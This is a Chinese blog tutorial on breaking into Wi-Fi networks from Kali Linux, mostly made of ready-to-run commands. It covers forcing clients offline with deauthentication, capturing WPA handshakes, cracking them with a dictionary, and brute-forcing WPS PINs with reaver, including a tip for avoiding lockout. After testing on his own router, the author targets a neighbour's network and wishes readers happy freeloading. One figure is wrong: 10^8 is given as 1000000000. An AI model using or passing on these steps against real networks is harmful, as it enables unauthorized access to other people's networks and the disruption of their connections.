# 利用kali破解wifi密码全过程
### 前期准备
1. 电脑
2. USB无线网卡（虚拟机不能调用电脑本机的无线网卡，得另外接）
3. kali系统
4. 靠谱的字典

### 一、暴力破解法
何为暴力破解呢，其实就是一个一个密码试，直到正确的密码为止。

现在的wifi一般加密都是：

1. 不启用安全‍‍‍‍
2. WEP‍‍‍‍
3. WPA/WPA2-PSK（预共享密钥）‍‍‍‍
4. WPA/WPA2 802.1X （radius认证）

#### 开始
+ 进入kali，启动终端，输入：`root@kali:~# airmon-ng`看看网卡信息

![](http://img0.tuicool.com/VR7Jz2.jpg)

+ `airmon-ng start wlan0`监听窗口

![](http://img0.tuicool.com/MriyIz3.jpg)

+ `airodump-ng mon0`扫描wifi信号

![](http://img0.tuicool.com/YJjy63b.jpg)

+ 这是我家wifi：上图可以看出,BSSID是 `00:0F:32:A0:99:DC`,信道（CH）是：1，

输入：`airodump-ng -w freedom -c CH --bssid 00:0F:32:A0:99:DC mon0 --ignore-negative-one`

解释：CH表示信道，信道是多少就填多少，freedom是一会抓握手包的文件名字，他会自动生成一个freedom.cap的文件，这个名字随便你们填什么

![](http://img1.tuicool.com/nI7bae.jpg)
![](http://img0.tuicool.com/vQBjQj.jpg)

`00:0F:32:A0:99:DC  64:5A:04:BB:54:57   -4    0e- 0e     0      400  `

`00:0F:32:A0:99:DC` 这个是路由器的mac

`64:5A:04:BB:54:57` 这个是客户端的mac

+ 重新开一个客户端输入命令：

`aireplay-ng --deaut 10 -a 00:0F:32:A0:99:DC -c 64:5A:04:BB:54:57 mon0 --ignore-negative-one`

![](http://img2.tuicool.com/r2UzeyR.jpg)

掉线了，当我们重新连接抓到握手包

![](http://img1.tuicool.com/biAVVnZ.jpg)

+ 破解握手包：

![](http://img0.tuicool.com/mem2ymR.jpg)

命令如下：

`aircrack-ng -w mi freedom-*.cap`

解释：mi字典名字      `freedom-*.cap`

![](http://img2.tuicool.com/b6n2Eb.jpg)

abc123abc这个就是我的wifi密码

破解完成，成功与否靠强大的字典和运气了，希望各位亲们蹭网愉快！！！

### 二、通过pin码破解
+ Wash 扫描开启WPS的网络。

`wash -i mon1 –C`

![](http://img0.tuicool.com/VvE7RjJ.jpg)

周围没有开启wps功能我wifi，就会出现上图那样，这样咋办呢

不要急，因为有些隐藏了起来，我们直接霸王硬上弓

用前面那个扫wifi的命令：

`airodump-ng mon0`

![](http://img2.tuicool.com/j6jMRz.jpg)

看见圈起来的mac没有,选择一个PWR的值的绝对值小于70的wifi破解

+ 我在这选择的是名字为: FAST_F70E的wifi

就他了：`E4:D3:32:7F:F7:0E  -45        2        0    0   6  54e. WPA2 CCMP   PSK  FAST_F70E`

然后命令如下:

`reaver -i mon0 -b E4:D3:32:7F:F7:0E -a -S -vv`

`E4:D3:32:7F:F7:0E` 这个mac根据路由器的mac更改，我破解的wifi的mac是`E4:D3:32:7F:F7:0E`

![](http://img1.tuicool.com/IZjueiM.jpg)

如图上表示可以破解，开启了wps功能

![](http://img0.tuicool.com/VbANJbZ.jpg)

出现上图这样，就表示不能破解,换其他wifi破解吧孩子

![](http://img0.tuicool.com/QrENbui.jpg)

这样就表示破解出来了

### 小知识
如果密码被改了,你知道他wifi的pin码就用如下命令：`reaver-i mon0 -b MAC -p PIN`

pin码有8位:所以就是10的8次方，要穷举1000000000次

这样pin也是有限制的，比如要被pin出的路由器必须得开启wps功能；貌似现在很多都是防pin路由器或300秒pin限制的。

破解时推荐这个命令：

`reaver -i mon0 -b E4:D3:32:7F:F7:0E -a -S –d9 –t9 -vv`

因为 `–d9 –t9`参数 可以防止pin死路由器。
